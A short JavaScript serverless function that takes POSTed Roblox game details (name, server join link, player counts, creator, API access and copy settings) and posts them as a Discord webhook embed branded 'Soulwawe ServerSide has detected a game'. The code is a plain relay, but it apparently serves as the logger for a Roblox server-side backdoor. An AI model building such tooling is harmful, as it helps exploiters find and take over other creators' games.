import fetch from 'node-fetch';
import dotenv from 'dotenv';

dotenv.config();  // .env dosyasını yükle

export async function handler(event, context) {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    const data = JSON.parse(event.body);

    const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
    if (!DISCORD_WEBHOOK_URL) {
      return { statusCode: 500, body: 'Webhook URL not set in environment variables' };
    }

    const embed = {
      embeds: [
        {
          title: `**${data.ROBLOX_GAME_NAME}**`,
          description: "Soulwawe ServerSide has detected a game",
          footer: { text: "Powered by Soulwawe | Credits: dnz" },
          color: 8388736,
          thumbnail: { url: data.ROBLOX_GAME_THUMBNAIL },
          author: { name: "Soulwawe Serverside" },
          fields: [
            {
              name: "**Game Info**",
              value: `**Name**: ${data.ROBLOX_GAME_NAME}
**Game Link:** [**Link**](https://roblox.com/games/${data.ROBLOX_PLACE_ID})
**Join Link:** [**Join**](https://www.roblox.com/games/start?launchData=${data.ROBLOX_JOB_ID}&placeId=${data.ROBLOX_PLACE_ID})
**Active Players**: \`${data.ROBLOX_GAME_PLAYING}\`
**Server Players**: \`${data.ROBLOX_SERVER_PLAYING}/${data.ROBLOX_GAME_MAXSIZE}\`
**Total Visits**: \`${data.ROBLOX_GAME_VISITS}\``,
              inline: true,
            },
            {
              name: "**Creator Info**",
              value: `> **Creator**: ${data.ROBLOX_CREATOR_NAME}
> [**Profile**](https://roblox.com/users/${data.ROBLOX_CREATOR_ID}/profile)
> **Universe ID**: \`${data.ROBLOX_UNIVERSE_ID}\``,
              inline: true,
            },
            {
              name: "**Settings**",
              value: `> **Rig Type**: ${data.ROBLOX_AVATAR_TYPE}
> **API Access**: ${data.ROBLOX_API_ACCESS}
> **Copying**: ${data.ROBLOX_COPY_ALLOWED}`,
              inline: true,
            },
          ],
          timestamp: data.ISO_TIMESTAMP,
        },
      ],
    };

    const res = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed),
    });

    if (!res.ok) {
      return { statusCode: 500, body: 'Failed to send webhook' };
    }

    return { statusCode: 200, body: 'Webhook sent' };
  } catch (e) {
    return { statusCode: 400, body: 'Invalid JSON or error: ' + e.message };
  }
}
